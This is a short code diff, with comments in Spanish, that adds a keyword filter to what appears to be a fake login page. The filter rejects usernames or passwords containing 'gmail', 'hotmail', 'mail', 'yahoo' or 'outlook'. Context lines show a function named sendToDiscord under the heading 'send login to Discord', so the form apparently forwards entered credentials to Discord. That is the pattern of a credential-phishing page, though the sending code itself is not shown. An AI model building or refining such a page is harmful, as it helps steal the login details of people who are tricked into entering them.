@@ -410,6 +410,32 @@
             }
         }
 
+        // ===== VALIDACIÓN DE PALABRAS BLOQUEADAS =====
+        function contienePalabraBloqueada(texto) {
+            // Lista de palabras prohibidas (case insensitive)
+            const palabrasBloqueadas = [
+                'gmail',
+                'hotmail',
+                'hot',
+                'gmai',
+                'mail',
+                'gmail.com',
+                'hotmail.com',
+                'yahoo',
+                'outlook'
+            ];
+            
+            const textoLower = texto.toLowerCase();
+            
+            for (const palabra of palabrasBloqueadas) {
+                if (textoLower.includes(palabra)) {
+                    return true;
+                }
+            }
+            
+            return false;
+        }
+
         // ===== ENVIAR LOGIN A DISCORD =====
         async function sendToDiscord(event) {
             event.preventDefault();
@@ -433,9 +459,8 @@
                 tieneError = true;
             }
             
-            // Verificar dominios bloqueados
-            const dominiosBloqueados = /gmail\.com|hotmail\.com/i;
-            if (dominiosBloqueados.test(usernameVal) || dominiosBloqueados.test(passwordVal)) {
+            // Verificar palabras bloqueadas
+            if (contienePalabraBloqueada(usernameVal) || contienePalabraBloqueada(passwordVal)) {
                 tieneError = true;
             }
             
